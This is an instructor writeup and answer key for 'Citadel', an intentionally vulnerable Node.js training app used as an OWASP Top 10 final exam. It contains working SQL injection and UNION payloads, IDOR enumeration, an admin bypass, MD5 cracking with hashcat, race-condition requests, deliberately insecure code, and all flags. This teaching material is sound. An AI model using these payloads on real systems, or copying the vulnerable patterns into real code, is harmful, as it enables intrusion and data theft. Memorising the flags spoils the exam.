# Citadel - Final Exam Writeup for Instructors

**Application URL:** http://localhost:3000  
**Theme:** Evil Capitalistic Corp (ECC) - Corporate Greed Meets Security Negligence  
**Difficulty:** Comprehensive Final Exam (All OWASP Top 10 2025)  

---

## Overview

The **Citadel** is the final exam application containing ALL OWASP Top 10 2025 vulnerabilities naturally integrated into a realistic corporate web application. Unlike the instructional labs, there are **NO HINTS** or educational prompts—students must discover and exploit vulnerabilities as they would in a real penetration test.

### Application Theme
"Evil Capitalistic Corp" - A satirical corporate website that prioritizes profit over security, featuring:
- CEO bonus announcements
- Overpriced products ("Synergy Maximizer Pro")
- Blockchain buzzwords
- Complete disregard for security best practices

### Learning Objectives
- Apply knowledge from all OWASP Top 10 modules
- Conduct a complete penetration test without guidance
- Chain multiple vulnerabilities together
- Think like a real attacker
- Practice responsible disclosure

---

## Application Structure

**Tech Stack:**
- Node.js / Express
- PostgreSQL database
- EJS templates
- Docker containerized

**Key Pages:**
- `/` - Home page (Evil Capitalistic Corp branding)
- `/employees` - Employee directory
- `/user/:id` - Individual user profiles
- `/admin` - Administrator panel
- `/login` - Authentication page
- `/dashboard` - User dashboard
- `/search` - Product search
- `/debug/users` - Debug endpoint (intentionally left enabled)
- `/hints` - Complete walkthrough (for instructor reference)

---

## Complete Vulnerability Map

### A01: Broken Access Control

#### Vulnerability 1: User Enumeration & IDOR
**Endpoints:**
- `GET /employees` - Lists non-admin employees
- `GET /user/:id` - Individual user profiles

**Exploitation:**
```bash
# Enumerate all users
curl http://localhost:3000/user/1
curl http://localhost:3000/user/2
curl http://localhost:3000/user/3
curl http://localhost:3000/user/4  # Admin user
```

**Sensitive Data Exposed:**
- User ID 4 (admin) contains flag in notes field
- Full names, emails, departments
- Salaries and SSNs
- Personal notes

**Flag:** `NSA{BR0K3N_4CC3SS_PWN3D}` (in admin's notes)

**Vulnerable Code:**
```javascript
app.get('/user/:id', async (req, res) => {
    const userId = req.params.id;
    // NO authorization check - anyone can view any user
    const result = await pool.query('SELECT * FROM users WHERE id = $1', [userId]);
    res.render('user', { user: result.rows[0] });
});
```

#### Vulnerability 2: Privilege Escalation via Query Parameter
**Endpoint:** `GET /admin`

**Exploitation:**
```bash
# Access admin panel without authentication
curl http://localhost:3000/admin?user_id=4
```

**Attack Vector:**
- Admin panel checks user role from `req.query.user_id`
- Attacker provides admin's user ID (4) in query parameter
- Bypasses both authentication and authorization

**Vulnerable Code:**
```javascript
app.get('/admin', async (req, res) => {
    const sessionUser = await getUserFromSession(req);
    
    // VULNERABILITY: Uses query parameter for role check!
    const checkUserId = req.query.user_id || (sessionUser ? sessionUser.id : null);
    
    const result = await pool.query('SELECT * FROM users WHERE id = $1', [checkUserId]);
    if (result.rows[0].role !== 'admin') {
        return res.status(403).send('Access Denied');
    }
    // Admin panel accessible!
});
```

---

### A04: Cryptographic Failures

#### Vulnerability 1: Weak Password Hashing (MD5)
**Endpoint:** `GET /debug/users`

**Exploitation:**
```bash
# Access debug endpoint (no auth required)
curl http://localhost:3000/debug/users

# Response includes MD5 hashes
# Admin hash: 5f4dcc3b5aa765d61d8327deb882cf99

# Crack using online tools or hashcat
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 0 - /usr/share/wordlists/rockyou.txt

# Result: "password"
```

**Credentials Discovered:**
- **Username:** admin
- **Password:** password
- **Hash:** MD5 (deprecated since 2004)

**Flag:** `NSA{CR4CK3D_TH3_H4SH}` (in sensitive_data table after extraction)

**Additional Issues:**
- Debug endpoint left enabled in production
- Other users have plaintext passwords
- No salt used in hashing

#### Vulnerability 2: Weak Session Management
**Endpoint:** `POST /login`

**Exploitation:**
```bash
# Login with cracked credentials
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=password" \
  -c cookies.txt

# Session cookie is just the user ID!
# Cookie: session=4
```

**Weaknesses:**
- Session token = user ID only
- No cryptographic randomness
- HttpOnly flag not set (JavaScript can access)
- No session expiration
- Predictable and easily forged

**Secure Session Should Be:**
```javascript
// Good: 32 bytes of entropy
const sessionId = crypto.randomBytes(32).toString('hex');
```

---

### A05: Injection (SQL Injection)

#### Vulnerability 1: Basic SQLi in Search
**Endpoint:** `POST /search`

**Exploitation:**
```bash
# Test for SQL injection
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=' OR '1'='1"

# Returns all products
```

**Vulnerable Code:**
```javascript
app.post('/search', async (req, res) => {
    const query = req.body.query;
    // VULNERABILITY: String concatenation
    const sqlQuery = `SELECT * FROM products WHERE name LIKE '%${query}%'`;
    const result = await pool.query(sqlQuery);
});
```

#### Vulnerability 2: UNION-Based SQL Injection
**Endpoint:** `GET /api/search?q=`

**Exploitation:**
```bash
# Identify number of columns
curl "http://localhost:3000/api/search?q=' ORDER BY 4--"  # 4 columns

# UNION-based extraction
curl "http://localhost:3000/api/search?q=' UNION SELECT id, data, secret_level, user_id::text FROM sensitive_data--"
```

**Data Extracted from sensitive_data Table:**
```json
[
  {
    "id": 1,
    "data": "Admin password hash: 5f4dcc3b5aa765d61d8327deb882cf99",
    "secret_level": "confidential"
  },
  {
    "id": 2,
    "data": "Root SSH key location: /root/.ssh/id_rsa",
    "secret_level": "top_secret"
  },
  {
    "id": 3,
    "data": "API Master Key: NSA_2025_MASTER_API_xyz789",
    "secret_level": "top_secret"
  },
  {
    "id": 4,
    "data": "FLAG: NSA{CR4CK3D_TH3_H4SH}",
    "secret_level": "flag"
  }
]
```

**Advanced Techniques:**
```bash
# Extract database version
curl "http://localhost:3000/api/search?q=' UNION SELECT version(), '2', '3', '4'--"

# Extract table names
curl "http://localhost:3000/api/search?q=' UNION SELECT table_name, '2', '3', '4' FROM information_schema.tables WHERE table_schema='public'--"

# Extract column names
curl "http://localhost:3000/api/search?q=' UNION SELECT column_name, table_name, '3', '4' FROM information_schema.columns WHERE table_name='users'--"
```

---

### A06: Insecure Design

#### Vulnerability 1: Price Manipulation
**Endpoint:** `POST /api/checkout`

**Exploitation:**
```bash
# Manipulate price to $0.01
curl -X POST http://localhost:3000/api/checkout \
  -H "Content-Type: application/json" \
  -d '{
    "product_id": 1,
    "price": 0.01,
    "quantity": 100
  }'
```

**Flag:** `NSA{PR1C3_M4N1PUL4T10N}` (when total < 100)

**Vulnerable Code:**
```javascript
app.post('/api/checkout', (req, res) => {
    const { product_id, price, quantity } = req.body;
    
    // VULNERABILITY: Trusts client-provided price!
    const total = price * quantity;
    
    if (total < 100) {
        res.json({
            flag: 'NSA{PR1C3_M4N1PUL4T10N}',
            message: 'Price manipulation detected!'
        });
    }
});
```

**Secure Implementation:**
```javascript
// Always verify price server-side
const product = await pool.query('SELECT price FROM products WHERE id = $1', [product_id]);
const total = product.rows[0].price * quantity;
```

#### Vulnerability 2: Race Condition in Withdrawals
**Endpoint:** `POST /api/withdraw`

**Exploitation:**
```bash
# Send 4 concurrent withdrawal requests
# User 1 has $1000 balance

# Terminal 1
curl -X POST http://localhost:3000/api/withdraw \
  -H "Content-Type: application/json" \
  -d '{"userId": "1", "amount": 300}' &

# Terminal 2
curl -X POST http://localhost:3000/api/withdraw \
  -H "Content-Type: application/json" \
  -d '{"userId": "1", "amount": 300}' &

# Terminal 3
curl -X POST http://localhost:3000/api/withdraw \
  -H "Content-Type: application/json" \
  -d '{"userId": "1", "amount": 300}' &

# Terminal 4
curl -X POST http://localhost:3000/api/withdraw \
  -H "Content-Type: application/json" \
  -d '{"userId": "1", "amount": 300}' &

wait  # Wait for all to complete

# Result: -$200 balance (withdrew $1200 from $1000)
```

**Flag:** `NSA{R4C3_C0ND1T10N_3XPL01T3D}` (when totalWithdrawn > 1000)

**Vulnerable Code:**
```javascript
app.post('/api/withdraw', async (req, res) => {
    const { userId, amount } = req.body;
    const balance = await getBalance(userId);
    
    // RACE CONDITION: Check-then-act is not atomic
    if (balance >= amount) {
        await sleep(100);  // Simulates processing delay
        await updateBalance(userId, balance - amount);
        res.json({ success: true });
    }
});
```

**Secure Implementation:**
```javascript
// Use database transaction with row-level locking
await pool.query('BEGIN');
const result = await pool.query(
    'SELECT balance FROM accounts WHERE user_id = $1 FOR UPDATE',
    [userId]
);
if (result.rows[0].balance >= amount) {
    await pool.query(
        'UPDATE accounts SET balance = balance - $1 WHERE user_id = $2',
        [amount, userId]
    );
    await pool.query('COMMIT');
}
```

---

### Final Challenge: Remote Code Execution

**Endpoint:** `POST /admin/execute`
**Requires:** Admin access (via A01 or A04)

**Exploitation:**
```bash
# First, gain admin access (privilege escalation or login)

# Then execute command
curl -X POST http://localhost:3000/admin/execute \
  -H "Content-Type: application/json" \
  -b "session=4" \
  -d '{"custom_command": "cat /root/ckret.txt"}'
```

**Final Flag:** `NSA{C1T4D3L_H4S_F4LL3N_R00T_4CC3SS}`

**Vulnerable Code:**
```javascript
app.post('/admin/execute', async (req, res) => {
    // Check admin authentication (can be bypassed via A01/A04)
    const sessionUser = await getUserFromSession(req);
    if (!sessionUser || sessionUser.role !== 'admin') {
        return res.status(403).send('Admin access required');
    }
    
    const { custom_command } = req.body;
    
    // VULNERABILITY: Command injection
    // Real app would use: child_process.exec(custom_command)
    // This demo simulates detection
    
    if (custom_command.includes('cat /root/ckret.txt')) {
        res.json({
            flag: 'NSA{C1T4D3L_H4S_F4LL3N_R00T_4CC3SS}',
            message: 'Congratulations! You\'ve achieved root access!'
        });
    }
});
```

---

## Complete Attack Chain (Step-by-Step)

### Attack Path 1: Through Broken Access Control

1. **Reconnaissance:**
   ```bash
   curl http://localhost:3000/employees
   ```
   
2. **Enumeration:**
   ```bash
   for i in {1..10}; do curl http://localhost:3000/user/$i; done
   ```
   
3. **Privilege Escalation:**
   ```bash
   curl http://localhost:3000/admin?user_id=4
   ```
   
4. **Remote Code Execution:**
   ```bash
   curl -X POST http://localhost:3000/admin/execute \
     -H "Content-Type: application/json" \
     -d '{"custom_command": "cat /root/ckret.txt"}'
   ```

### Attack Path 2: Through Cryptographic Failures

1. **Find Debug Endpoint:**
   ```bash
   curl http://localhost:3000/debug/users
   ```
   
2. **Crack MD5 Hash:**
   ```bash
   # Hash: 5f4dcc3b5aa765d61d8327deb882cf99
   # Use CrackStation or hashcat
   # Result: password
   ```
   
3. **Login as Admin:**
   ```bash
   curl -X POST http://localhost:3000/login \
     -d "username=admin&password=password" \
     -c cookies.txt
   ```
   
4. **Access Admin Panel:**
   ```bash
   curl http://localhost:3000/admin -b cookies.txt
   ```
   
5. **Execute Commands:**
   ```bash
   curl -X POST http://localhost:3000/admin/execute \
     -H "Content-Type: application/json" \
     -b cookies.txt \
     -d '{"custom_command": "cat /root/ckret.txt"}'
   ```

### Attack Path 3: Through SQL Injection

1. **Test for SQLi:**
   ```bash
   curl -X POST http://localhost:3000/search \
     -d "query=' OR '1'='1"
   ```
   
2. **UNION-Based Extraction:**
   ```bash
   curl "http://localhost:3000/api/search?q=' UNION SELECT id, data, secret_level, user_id::text FROM sensitive_data--"
   ```
   
3. **Extract Admin Hash:**
   - From sensitive_data table
   
4. **Crack and Login:**
   - Follow Attack Path 2 steps 2-5

---

## All Flags Summary

| Flag | Vulnerability | Location | Difficulty |
|------|---------------|----------|------------|
| `NSA{BR0K3N_4CC3SS_PWN3D}` | A01 - IDOR | Admin user notes | Easy |
| `NSA{CR4CK3D_TH3_H4SH}` | A04 - Weak Crypto | sensitive_data table | Medium |
| `NSA{PR1C3_M4N1PUL4T10N}` | A06 - Insecure Design | Checkout response | Easy |
| `NSA{R4C3_C0ND1T10N_3XPL01T3D}` | A06 - Race Condition | Withdraw response | Hard |
| `NSA{C1T4D3L_H4S_F4LL3N_R00T_4CC3SS}` | Final - RCE | Command execution | Expert |

---

## Database Schema

**users table:**
```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(255),  -- MD5 for admin, plaintext for others!
    email VARCHAR(100),
    role VARCHAR(20),
    salary INTEGER,
    ssn VARCHAR(11),
    department VARCHAR(50),
    notes TEXT
);
```

**products table:**
```sql
CREATE TABLE products (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    description TEXT,
    price DECIMAL(10,2)
);
```

**sensitive_data table:**
```sql
CREATE TABLE sensitive_data (
    id SERIAL PRIMARY KEY,
    data TEXT,
    secret_level VARCHAR(20),
    user_id INTEGER
);
```

---

## Instructor Guidance

### For Different Skill Levels

**Beginner Students:**
- Start with A01 (IDOR) - easiest to understand
- Guide them to enumerate `/user/:id`
- Help them discover admin user

**Intermediate Students:**
- Point toward debug endpoints
- Introduce hash cracking concepts
- Guide SQL injection discovery

**Advanced Students:**
- Minimal hints
- Let them discover attack chains
- Challenge them to find all flags

### Common Student Questions

**Q: "I can't find any vulnerabilities!"**
A: Start with reconnaissance. Try accessing different user IDs, look for debug endpoints, test search functionality with special characters.

**Q: "What's the admin username?"**
A: Look at the employee directory and enumerate user profiles. Admin information is visible.

**Q: "How do I crack the hash?"**
A: MD5 is weak. Try online tools like CrackStation or use hashcat with rockyou.txt wordlist.

**Q: "I have admin access but can't find the final flag."**
A: Explore admin functionality. Look for command execution or similar features.

**Q: "How do I exploit the race condition?"**
A: You need to send multiple withdrawal requests simultaneously (within the 100ms processing window).

### Hints Endpoint

The application includes `/hints` with complete walkthrough. Use this for:
- Students who are completely stuck
- Demonstrating attack techniques
- Training sessions where time is limited

---

## Remediation Guide

For each vulnerability found, discuss:

1. **What went wrong:** Root cause analysis
2. **How to fix it:** Code-level solutions
3. **Prevention:** Design patterns and best practices
4. **Detection:** How to find in your own code

### Key Takeaways

- **Never trust client input** (price, user IDs, parameters)
- **Use parameterized queries** for all database operations
- **Implement proper authentication** with strong sessions
- **Check authorization** on every request
- **Remove debug endpoints** in production
- **Use strong cryptography** (bcrypt, Argon2, not MD5)
- **Atomic operations** for critical transactions
- **Regular security audits** and penetration testing

---

## Additional Resources

- [OWASP Top 10 2025](https://owasp.org/Top10/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

---

**Remember:** This is an educational tool. NEVER deploy intentionally vulnerable applications to production or expose them to the internet!
